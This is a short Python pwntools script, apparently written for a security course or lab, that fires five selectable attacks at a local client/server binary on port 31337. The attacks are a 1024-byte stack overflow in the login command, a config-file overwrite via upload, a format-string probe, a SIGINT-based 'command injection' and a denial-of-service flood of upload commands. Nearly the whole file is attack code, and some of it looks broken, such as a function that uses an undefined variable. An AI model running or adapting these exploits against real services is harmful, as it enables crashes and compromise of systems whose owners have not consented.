from pwn import *

context(arch = 'i386', os = 'linux')

server_ip = "127.0.0.1"
server_port = "31337"

# Exploits upon selection
# See the poc documents for details
# Options are: 
# 1: Stackover flow 1
# 2: Stackover flow 2
# 3: Format String 
# 4: Command Injection
# 5: Dos attack


def run_stack1():
    print "running stack1 exploits"
    p = process(["./bin/client", server_ip, server_port])
    num = 1024
    p.sendline("login " + 'a' * num)
    print p.recvline(timeout=1)


def run_stack2():
    print "running stack2 exploits"
    #  login
    p = process(["./bin/client", server_ip, server_port])
    p.sendline("login root")
    p.sendline("login root")
    # Upload and overwrite the configuration file  
    p.sendline("put sploit.conf")


def run_format_string():
    print "running format string exploit"
    server_ip = "%x%x%x%x%x%x"
    p = process(["./bin/client", server_ip, server_port])
    print p.recvline(timeout=1)


def run_cmd_inj():
    print "running cmd inj exploit"
    p = process(["./bin/client", server_ip, server_port])
    # send SIGINT 
    p.sendline("\x03")

def run_dos():
    print "running dos attack"
    p = process(["./bin/client", server_ip, server_port])
    # normal login
    p.sendline("login root")
    p.sendline("pass root")
    # DoS, send trash 
    for i in range(0, 1024):
        p.sendline("put TRASH")



options = {
        1: run_stack1,
        2: run_stack2,
        3: run_format_string,
        4: run_cmd_inj,
        5: run_dos,
        }



def run_exploit(choice):
    p.sendline("login root")
    p.sendline("pass root")


def main():
    option = 4
    options[option]()


main()

